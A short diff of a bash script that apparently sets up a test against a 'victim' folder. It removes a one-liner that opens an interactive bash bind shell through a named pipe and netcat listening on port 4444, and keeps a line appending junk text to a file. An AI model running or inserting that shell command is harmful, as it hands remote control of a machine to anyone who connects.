@@ -1,6 +1,4 @@
 #!/usr/bin/env bash
-lsof -i :6767 || rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -lvp 4444 > /tmp/f &
-
 {
   echo "6767676766766776767 yibbi 66767676767676"
 } >> ~/Testing/victim/67.txt
